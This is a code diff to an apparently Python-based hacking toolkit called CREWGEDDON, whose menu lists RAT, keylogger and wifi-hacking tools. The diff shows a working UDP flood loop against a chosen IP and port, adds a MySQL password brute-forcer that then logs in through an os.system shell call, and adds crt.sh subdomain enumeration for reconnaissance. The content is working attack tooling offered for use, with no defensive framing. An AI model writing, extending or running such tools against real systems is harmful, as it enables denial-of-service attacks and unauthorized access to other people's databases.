@@ -3,6 +3,9 @@ import socket
 import random
 import os
 import time
+import pymysql
+pymysql.install_as_MySQLdb()
+import requests
 
 os.system("cls")
 os.system("clear")
@@ -25,7 +28,7 @@ print(Fore.GREEN + "-------------------------")
 print(Fore.GREEN + "[6]" + Fore.BLUE + " - RAT Tools")
 print(Fore.GREEN + "[7]" + Fore.BLUE + " - KeyLogger Tools")
 print(Fore.GREEN + "-------------------------")
-print(Fore.GREEN + "[8]" + Fore.BLUE + " - Wifi Hack Tools (Monitor Mode)")
+print(Fore.GREEN + "[8]" + Fore.BLUE + " - Wifi Hack Tools (Monito@r Mode)")
 print(Fore.GREEN + "[9]" + Fore.BLUE + " - Wifi Monitor Mode")
 print(Fore.GREEN + "[10]" + Fore.BLUE + " - Wifi Managed Mode")
 print(Fore.GREEN + "-------------------------")
@@ -60,17 +63,70 @@ while True:
                   ip = input(Fore.BLUE + "[CREWGEDDON-DDOS]: Enter IP Adress: ")
                   port = int(input(Fore.BLUE + "[CREWGEDDON-DDOS]: Enter Port: "))
                   crewsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                  sayac = 0
+                  counter = 0
                   crewrandom = random.randbytes(9999)
                   while True:
                        crewsock.sendto(crewrandom, (ip, port))
                        time.sleep(0.5)
-                       print(Fore.RED + "[CREWGEDDON-DDOS]: " + Fore.GREEN + f"The attack is being successfully sent to {ip} (%{sayac})")
-                       sayac = sayac + 1
-                       if sayac >= 5000:
+                       print(Fore.RED + "[CREWGEDDON-DDOS]: " + Fore.GREEN + f"The attack is being successfully sent to {ip} (%{counter})")
+                       counter = counter + 1
+                       if counter >= 5000:
                             print(Fore.RED + "[CREWGEDDON-DDOS]: The attack stoped.")
                             break
-      # Will continue from here.
+      elif select == "4":
+                  print(Fore.RED + "[CREWGEDDON]: Welcome to MySql Brute Force Tool")
+                  host = input(Fore.BLUE + "[CREWGEDDON-MySql]: Enter MySql Host (localhost): ")
+                  user = input(Fore.BLUE + "[CREWGEDDON-MySql]: Enter MySql User (root): ")
+                  password_file = input(Fore.BLUE + "[CREWGEDDON-MySql]: Enter Password File Path (passwords.txt): ")
+                  passwords = open(password_file, "r").readlines()
+                  for password in passwords:
+                      password = password.strip()
+                      try:
+                        db = pymysql.connect(host, user, password)
+                        print(Fore.GREEN + f"[CREWGEDDON-MySql]: Success! Password found: {password}")
+                        mysql_login = input(Fore.BLUE + "[CREWGEDDON-MySql]: Login MySql? (y/n): ")
+                        
+                        if mysql_login.lower() == "y":
+                              os.system(f"mysql -u {user} -p {password} -h {host}")
+                        elif mysql_login.lower() == "n":
+                              break
+                        else:
+                              print(Fore.RED + "[CREWGEDDON-MySql]: Invalid option selected.")
+                              break
+                        
+                      except pymysql.Error:
+                          print(Fore.RED + f"[CREWGEDDON-MySql]: Failed attempt with password: {password}") 
+      elif select == "5":
+            domain = input(Fore.BLUE + "[CREWGEDDON]: Enter Domain (crew.com): ").strip()
+            url = f"https://crt.sh/?q=%25.{domain}&output=json"
+
+            try:
+                resp = requests.get(url, timeout=30)
+                resp.raise_for_status()
+            except requests.RequestException as e:
+                print(Fore.RED + f"[CREWGEDDON]: Request failed: {e}")
+            try:
+                data = resp.json()
+            except ValueError:
+                print(Fore.RED + "[CREWGEDDON]: Not return JSON")
+            subs = set()
+
+            for entry in data:
+                name = entry.get("name_value")
+                if not name:
+                    continue
+                for n in name.splitlines():
+                    n = n.strip()
+                    if n.endswith(domain):
+                        subs.add(n)
+
+            if not subs:
+                print(Fore.YELLOW + "[CREWGEDDON-SubDomain]: No subdomains found.")
+            else:
+                print(Fore.BLUE + "[CREWGEDDON-SubDomain]: Subdomains found:")
+                for sub in sorted(subs):
+                    print(Fore.GREEN + f"[CREWGEDDON-SubDomain]: {sub}")
+
       elif select == "11":
             print(Fore.RED + "[CREWGEDDON]: Exiting...")
             os.system("exit")
